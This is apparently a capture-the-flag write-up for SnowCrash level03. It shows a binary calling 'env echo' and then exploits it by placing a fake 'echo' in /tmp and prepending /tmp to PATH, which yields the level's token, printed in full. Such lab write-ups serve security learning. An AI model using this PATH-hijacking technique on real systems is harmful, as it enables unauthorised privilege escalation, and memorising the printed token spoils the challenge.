# level03

Using ls we can directly see there is a binary.

```bash
level03@SnowCrash:~$ ls
level03
level03@SnowCrash:~$ ./level03 
Exploit me
```

Ok, let's use readelf to find strings in binary. (Option -p, --string-dump)

```bash
level03@SnowCrash:~$ readelf -p .rodata ./level03

String dump of section '.rodata':
  [     8]  /usr/bin/env echo Exploit me
```

Ok, let's spoof the echo binary.

```bash
level03@SnowCrash:~$ touch echo
touch: cannot touch `echo': Permission denied
```

No permissions, let's move to /tmp.

``` bash
level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:/tmp$ echo "/bin/getflag" > echo
level03@SnowCrash:/tmp$ chmod 777 echo                  # Dont forget to change permissions
level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
level03@SnowCrash:/tmp$ cd -
/home/user/level03
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ 
```

Perfect, let's move to the level04.

```bash
level03@SnowCrash:~$ su level04
Password: qi0maab88jeaj46qoumi7maus
level04@SnowCrash:~$ 
```
